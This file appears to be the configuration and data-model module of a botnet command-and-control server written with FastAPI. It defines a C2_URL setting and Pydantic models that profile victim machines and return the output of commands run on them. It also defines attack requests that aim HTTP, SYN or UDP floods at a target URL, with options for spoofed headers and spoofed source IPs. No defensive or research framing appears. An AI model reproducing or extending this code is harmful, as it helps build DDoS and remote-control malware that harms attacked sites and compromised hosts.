from dotenv import load_dotenv
import os
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, HttpUrl
from typing import Optional, Dict

load_dotenv()
DB_NAME=os.getenv('DB_NAME')
DB_USER=os.getenv('DB_USER')
DB_PASSWD = os.getenv('DB_PASSWD')
DB_HOST=os.getenv('DB_HOST')
DB_PORT=os.getenv('DB_PORT')
PEPPER = os.getenv('PEPPER')
SECRET_KEY = os.getenv('SECRET_KEY')
ALGORITHM = os.getenv('ALGORITHM')

REDIS_HOST=os.getenv('REDIS_HOST')
REDIS_PORT=os.getenv('REDIS_PORT')

C2_URL=os.getenv('C2_URL')

templates = Jinja2Templates(directory='templates')

class SystemDetails(BaseModel):
    username: str
    hostname: str
    os: str
    cpu: str
    gpu: str
    ram: str
    disk: str
class CurrentDirectory(BaseModel):
    current_directory: str

class CommandResult(BaseModel):
    command: str
    result: str

class AttackRequest(BaseModel):
    attack_type: str
    intensity: int
    duration: int
    target_url: HttpUrl
    spoof_headers: Optional[bool] = False
    custom_headers: Optional[Dict[str, str]] = {}
    target_port: Optional[int]=None
    spoof_ip: Optional[bool]=False
    packet_size: Optional[int]=None

class AttackResponse(BaseModel):
    attack_id: str
    status: str
    message: str

SUPPORTED_ATTACK_TYPES = ["HTTP_FLOOD", "SYN_FLOOD", "UDP_FLOOD"]